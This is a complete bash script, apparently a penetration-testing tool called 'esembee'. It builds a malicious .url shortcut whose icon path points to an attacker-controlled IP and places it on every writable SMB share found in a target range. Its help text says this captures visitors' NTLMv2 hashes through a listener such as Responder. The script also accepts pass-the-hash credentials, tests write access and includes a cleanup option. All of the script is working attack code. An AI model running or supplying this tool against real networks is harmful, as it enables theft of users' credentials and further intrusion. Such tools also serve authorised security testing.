#!/bin/bash
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
RESET="\033[0m"
BOLD="\033[1m"
######
###Functions of the script listed below
######
#######function for the URL file creation
unset urlfile

####
###generator###
#####
# Function for generating a URL file
function Generator() {
    echo "-------------------------"
    echo "| URL File Generator   |"
    echo "-------------------------"

    # Use 'ip' command to get IP addresses
    available_ips=($(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}'))

    PS3="Select the IP you'd like to use or enter 'custom': "
    options=("${available_ips[@]}" "Custom IP" "Quit")
    select opt in "${options[@]}"; do
        case $opt in
            "Custom IP")
                read -p "Enter the custom IP address: " IP
                break
                ;;
            "Quit")
                echo "Exiting..."
                return
                ;;
            *) 
                if [[ -n $opt ]]; then
                    IP=$opt
                    break
                else
                    echo "Invalid selection. Please try again."
                fi
                ;;
        esac
    done

    # Allow user to set a custom filename or use a default
    read -p "Enter a filename (leave blank for default name @Esembee.URL): " gurlfile
    if [[ -z $gurlfile ]]; then
        gurlfile="@Esembee.url"
    fi

    echo '[InternetShortcut]
URL=http://google.com
WorkingDirectory=%username%
IconFile=\\'"$IP"'\%USERNAME%.icon
IconIndex=1' > "$gurlfile"
    urlfile="$gurlfile"
    echo -e "-------------------------"
    echo -e "| ${GREEN}File Created${RESET}           |"
    echo -e "-------------------------"
    echo -e "\n"
    echo "File $urlfile created with listener IP $IP"
}


######
##################Function for URL file selection
function FileSelection() {
    echo "-------------------------"
    echo "| URL File Selection   |"
    echo "-------------------------"

    urlfilearray=( *.url )

    if [ ${#urlfilearray[@]} -eq 0 ]; then
        echo "No URL files found."
    else
        echo "Found the following URL files:"
        PS3="Select a file or option: "
        select option in "${urlfilearray[@]}" "File Not Found--Select a different Name" "Quit"; do
            case $option in
                "Quit")
                 
                    echo "Exiting..."
                    exit
                    ;;
                "File Not Found--Select a different Name")
                
                    read -p "Enter a custom filename: " urlfile
                    echo -e "\n\n"
                    break
                    ;;
                *)
                    urlfileS=$option
                    
                    echo "Selected $urlfileS"
                    break
                    ;;
            esac
        done
    fi
}

# Function to display ASCII art spelling "ESEMBEE"
function display_ascii_art() {
echo "
EEEEEEEEEEEEEEEEEEEEEE   SSSSSSSSSSSSSSS EEEEEEEEEEEEEEEEEEEEEEMMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
E::::::::::::::::::::E SS:::::::::::::::SE::::::::::::::::::::EM:::::::M             M:::::::MB::::::::::::::::B  E::::::::::::::::::::EE::::::::::::::::::::E
E::::::::::::::::::::ES:::::SSSSSS::::::SE::::::::::::::::::::EM::::::::M           M::::::::MB::::::BBBBBB:::::B E::::::::::::::::::::EE::::::::::::::::::::E
EE::::::EEEEEEEEE::::ES:::::S     SSSSSSSEE::::::EEEEEEEEE::::EM:::::::::M         M:::::::::MBB:::::B     B:::::BEE::::::EEEEEEEEE::::EEE::::::EEEEEEEEE::::E
  E:::::E       EEEEEES:::::S              E:::::E       EEEEEEM::::::::::M       M::::::::::M  B::::B     B:::::B  E:::::E       EEEEEE  E:::::E       EEEEEE
  E:::::E             S:::::S              E:::::E             M:::::::::::M     M:::::::::::M  B::::B     B:::::B  E:::::E               E:::::E             
  E::::::EEEEEEEEEE    S::::SSSS           E::::::EEEEEEEEEE   M:::::::M::::M   M::::M:::::::M  B::::BBBBBB:::::B   E::::::EEEEEEEEEE     E::::::EEEEEEEEEE   
  E:::::::::::::::E     SS::::::SSSSS      E:::::::::::::::E   M::::::M M::::M M::::M M::::::M  B:::::::::::::BB    E:::::::::::::::E     E:::::::::::::::E   
  E:::::::::::::::E       SSS::::::::SS    E:::::::::::::::E   M::::::M  M::::M::::M  M::::::M  B::::BBBBBB:::::B   E:::::::::::::::E     E:::::::::::::::E   
  E::::::EEEEEEEEEE          SSSSSS::::S   E::::::EEEEEEEEEE   M::::::M   M:::::::M   M::::::M  B::::B     B:::::B  E::::::EEEEEEEEEE     E::::::EEEEEEEEEE   
  E:::::E                         S:::::S  E:::::E             M::::::M    M:::::M    M::::::M  B::::B     B:::::B  E:::::E               E:::::E             
  E:::::E       EEEEEE            S:::::S  E:::::E       EEEEEEM::::::M     MMMMM     M::::::M  B::::B     B:::::B  E:::::E       EEEEEE  E:::::E       EEEEEE
EE::::::EEEEEEEE:::::ESSSSSSS     S:::::SEE::::::EEEEEEEE:::::EM::::::M               M::::::MBB:::::BBBBBB::::::BEE::::::EEEEEEEE:::::EEE::::::EEEEEEEE:::::E
E::::::::::::::::::::ES::::::SSSSSS:::::SE::::::::::::::::::::EM::::::M               M::::::MB:::::::::::::::::B E::::::::::::::::::::EE::::::::::::::::::::E
E::::::::::::::::::::ES:::::::::::::::SS E::::::::::::::::::::EM::::::M               M::::::MB::::::::::::::::B  E::::::::::::::::::::EE::::::::::::::::::::E
EEEEEEEEEEEEEEEEEEEEEE SSSSSSSSSSSSSSS   EEEEEEEEEEEEEEEEEEEEEEMMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
"
}

# Call the function to display ASCII art


######function for the file placement
function URLfileplacement () {
if [[ -v allips ]]
then
if [[ -v targetip ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
if [[ -v share ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
Lines=$(cat $allips)
for Line in $Lines
do
   echo "Testing SMB connection to "$Line""
   echo -e "\n\n"
   readarray -t lines < <(smbclient -L "$Line" -U "$u"%"$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
   	for line in "${lines[@]}"; do
        if smbclient \\\\"$Line"\\"$line" -U $u%$p $h -c "put $urlfile" >/dev/null 2>/dev/null
   	then 
   	echo -e "${BOLD}${GREEN}$u has WRITE permissions for $line at $Line ${RESET}" 
   	echo -e "\n\n"
   	echo -e "${BOLD}${GREEN}File $urlfile placed on $Line at share $line ${RESET}" 
   	fi
   	done
done
else
if [[ ! -v targetip ]];
then
echo "Target not set. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting... "
exit
fi
if [[ ! -v share ]];
then
echo "Target Share not set. -I option requires a specific share to be targeted. Set with -S argument."
exit
fi
echo "Testing connection to $targetip"
echo -e "\n\n"
smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "put $urlfile" 
echo -e "\n\n"
echo "Listing $share at $targetip to confirm placement"
echo -e "\n\n"
smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "ls" 
fi
}

###########
#######Function for the cleanup option
function URLfileremoval () {
if [[ -v urlfile ]];
then echo "attempting removal of "$urlfile""
else
FileSelection
fi
if [[ -v allips ]]
then
if [[ -v targetip ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
if [[ -v share ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
Lines=$(cat $allips)
for Line in $Lines
do
   echo "Testing SMB connection to "$Line""
   readarray -t lines < <(smbclient -L "$Line" -U "$u"%"$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
   	for line in "${lines[@]}"; do
        if smbclient \\\\"$Line"\\"$line" -U $u%$p $h -c "rm $urlfile" >/dev/null 2>/dev/null
   	then 
   	echo -e "\n\n"
   	echo -e "${BOLD}${GREEN}$u has WRITE permissions for $line at $Line ${RESET}" 
   	echo -e "${BOLD}${GREEN}File $urlfile REMOVED on $Line at share $line ${RESET}" 
   	fi
   	done
done
else
if [[ ! -v targetip ]];
then
echo "Target not set. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
if [[ ! -v share ]];
then
echo "Target Share not set. Set with -S argument."
exit
fi
echo "Testing connection to $targetip"
smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "rm $urlfile" 
echo -e "\n\n"
echo "Listing $share at $targetip to confirm removal"
echo -e "\n\n"
smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "ls" 
fi
exit
}
########################
#######Function for Test WRITE access####
function Testconnection () {
if [[ -v allips ]];
then
if [[ -v targetip ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
if [[ -v share ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
Lines=$(cat $allips)
for Line in $Lines
do
   touch testfile.txt
   echo "Testing SMB connection to "$Line""
   readarray -t lines < <(smbclient -L "$Line" -U "$u"%"$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
   	for line in "${lines[@]}"; do
   	if smbclient \\\\"$Line"\\"$line" -U $u%$p $h -c "put testfile.txt ; rm testfile.txt" >/dev/null 2>/dev/null 
   	then 
   	echo -e "\n\n"
   	echo -e "${BOLD}${GREEN} $u has WRITE permissions for $line at $Line ${RESET}" 
   	fi
   	done
done
else
if [[ ! -v targetip ]];
then
echo "Target not set. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
if [[ ! -v share ]];
then
echo "Target Share not set. Set with -S argument."
exit
fi
touch testfile.txt
echo "Testing connection to $targetip"
if smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "put testfile.txt ; rm testfile.txt" >/dev/null 2>/dev/null
then
echo "$u has WRITE access to $share at $targetip."
else
echo "$u cannot WRITE to $share at $targetip." 
fi
fi
rm testfile.txt
exit
}

#############
########Variable Check Function####
##############################
function variablecheck () {
if [[ ! -v u ]];
then
echo "Username not set. Use -u to set username. Exiting..."
exit
fi
if [[ ! -v p ]];
then
echo "password not set. Use -p to set password. Exiting..."
exit
fi
}
############HELPMENU########
function helpmenu () {
   # Display Help
   echo "This script can generate a a malicious URL file containing the IP of a listener, scan a scope of IPs for WRITE access, and place the URL file on writable shares. When the share is accessed by a victim, their NTLMv2 hash can be captured via a listener like Responder." 
   echo
   echo "To specify a target: Either a list of IPs can be supplied with the -f option or a specific target IP can be supplied with -I along with a specific share -S, ie ./esembee.sh -I <target IP> -S <target share> or ./esembee.sh -f <scopeips.txt>"
   echo
   echo "Syntax to generate and place URL file on target IP and share: ./esembee.sh -u <domain/username> -p <password> -I <192.168.8.8> -S <sharename>"
   echo
   echo "Syntax to run cleanup on a specific share: ./esembee.sh -u <domain/username> -p <password> -I <192.168.8.8> -S <sharename> -C -F <urlfile>"
   echo
   echo "Syntax to scan scope of IPs for WRITE access: ./esembee.sh -u <domain/username> -p <password> -f <scopeIPs.txt> -t"
   echo
   echo "options:"
   echo "-u     This argument is required. Supply the domain/username"
   echo "-p     This argument is required. Supply the password or hash of the domain user"
   echo "-H     Optional argument to use when the supplied password is an NTLM hash"
   echo "-I     Optional target specification for a single IP. Must also specify the share with the -S argument"
   echo "-S     Optional target specification to be used in conjunction with the -I argument"
   echo "-f     Optional target specification. Supply a txt file of possible target IPs"
   echo "-C     Optional argument to run the clean up utility to remove the URL file."
   echo "-F     Optional argument if you already have a URL file created. If not specified the tool will assist with generating a URL file."
   echo "-t     Optional argument to test for WRITE access against against a target."
   echo "-L     Optional argument to set the IP for the listener in the URL file and bypass the user input during URL file creation process"
   echo "-G     Optional argument to just run the URL File Generator."
exit
}
####OPTIONS FOR SCRIPT#####
while getopts t,u:p:f:H,h,C,F:I:S:L:G options; do
	case $options in
		u) u=$OPTARG;;
		p) p=$OPTARG;;
		f) allips=$OPTARG;;
		H) h=--pw-nt-hash;;
		t) t=Testconnection;;
		h) Help=helpmenu;;
		C) cleanup=URLfileremoval;;
		F) urlfile=$OPTARG;;
		I) targetip=$OPTARG;;
		S) share=$OPTARG;;
		L) IP=$OPTARG;;
		G) Generate=Generator;;
		?) echo "unknown option set exiting.."
		exit;;
	esac
done
################### SCRIPT ACTIONS  ####################################
$Help
display_ascii_art
if [[ -n $Generate ]]; then
    $Generate  # Call the assigned function
    exit  # Exit after the desired actions are completed
fi
variablecheck

$t
$cleanup
if [[ -v urlfile ]];
then
"URLfileplacement"
else
echo "No URL file set. Do you need a URL file created? [y or n]"
read Filecreationneeded
if [ $Filecreationneeded == y ]
then "Generator"
"URLfileplacement"
else 
"FileSelection"
"URLfileplacement"
fi
fi
